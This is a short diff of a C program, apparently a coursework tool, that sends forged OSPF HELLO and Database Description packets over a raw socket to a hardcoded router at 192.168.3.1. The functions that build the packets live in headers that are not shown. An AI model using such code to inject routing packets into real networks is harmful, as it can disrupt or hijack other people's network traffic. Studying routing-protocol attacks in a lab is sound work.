@@ -13,6 +13,8 @@
 #include <net/ethernet.h>
 #include <netinet/ether.h>
 #include <arpa/inet.h>
+
+#include "utils.h"
 #include "ospf_attack.h"
 
 unsigned char *parse_ip_addr(char *ip_str);
@@ -33,6 +35,7 @@ int main(int argc, char *argv[]) {
   char *iface_index_str = argv[1]; // TODO: Usar para ler pacotes
   char *local_mac_str   = argv[2];
   char *local_ip        = argv[3];
+  char *router_ip       = "192.168.3.1";
 
   // Convert input to bytes
   unsigned char *local_mac = parse_mac_addr(local_mac_str);
@@ -50,23 +53,19 @@ int main(int argc, char *argv[]) {
   destAddr.sll_ifindex = iface_index;
   memcpy(&(destAddr.sll_addr), dest_mac, MAC_ADDR_LEN);
 
-  /* 0x01 para HELLO e 0x02 para DB description */
-  int packet_len = build(buffer, local_mac, local_ip, 0x01);
+  int packet_len = attack_write_hello(buffer, local_mac, local_ip, router_ip);
   if((ret_value = sendto(sock_fd, buffer, packet_len, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
     printf("ERROR! sendto() \n");
     exit(1);
   }
-  printf("Send success (%d).\n", ret_value);
-  //sleep(1);
+  printf("Send HELLO success (%d).\n", ret_value);
 
-  /* 0x01 para HELLO e 0x02 para DB description */
-  packet_len = build(buffer, local_mac, local_ip, 0x02);
+  packet_len = attack_write_db_description(buffer, local_mac, local_ip, router_ip);
   if((ret_value = sendto(sock_fd, buffer, packet_len, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
     printf("ERROR! sendto() \n");
     exit(1);
   }
-
-  printf("Send success (%d).\n", ret_value);
+  printf("Send DB Description success (%d).\n", ret_value);
 
   return 0;
 }
